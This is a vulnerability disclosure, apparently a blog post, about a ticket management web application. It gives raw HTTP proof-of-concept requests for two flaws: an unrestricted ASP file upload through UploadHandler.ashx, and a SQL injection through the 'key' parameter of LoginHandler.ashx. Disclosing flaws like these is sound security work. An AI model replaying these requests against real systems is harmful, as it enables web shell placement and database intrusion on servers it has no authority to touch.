## File upload


- Vulnerability Name: Ticket Management System Standard Version - File Upload Vulnerability

- Vulnerabilities URL:/WiChat/ashx/UploadHandler. ashx

- Vulnerability description: UploadHandler does not filter uploaded files in any way

- Temporary solution: Set the permission to disable script running on the folder UploadImage



- Vulnerability related code

!(https://github.com/shigophilo/shigophilo.github.io/blob/main/_posts/imgs/2024-08-12-%E7%A5%A8%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%A0%87%E5%87%86%E7%89%88-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240812124039627.png?raw=true)

- Method for reproducing vulnerabilities

![image-20240812124118510](imgs/2024-08-12-票务管理系统标准版-文件上传漏洞/image-20240812124118510.png)

- visit url/UploadImage/1.asp

![image-20240812124205940](imgs/2024-08-12-票务管理系统标准版-文件上传漏洞/image-20240812124205940.png)

- POC

```
GET /WeChat/ashx/UploadHandler.ashx HTTP/2
Host: host
Cookie: ASP.NET_SessionId=uuigwbm4v4b30ykuja5c2xsn; SESSIONID=VAEAADILWiMFEnkxjy0Io/Rwsst9uE3mxlZfIc8i6UI=&VAEAAPWddZzuRvJK3ALg8A==&HUAWEI &langfrombrows=zh-CN,&copyright=2014-2022; ASPSESSIONIDSGDRADAS=DPFDAIDBPACHPBHNFJOHLILC
Cache-Control: max-age=0
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://117.145.188.82:8010/WeChat/ashx/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Content-Length: 7483

------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="file"; filename="1.asp"
Content-Type: image/jpeg

<% 
    Response.Write "Hello, World!"
%>
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
```

## Sql Inject

- parameter : key

```
POST /LoginHandler.ashx HTTP/2
Host: host
Cookie: ASP.NET_SessionId=lxzevhb5yxdj0nqa43tz3qat
Content-Length: 65
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: host
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: host
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

Method=GetSystemConfig&class.module.classLoader.URLs[a0]=&key=w
```

![image-20240812140603223](imgs/zhongcheng_kexin_ticketing_management_platform/image-20240812140603223.png)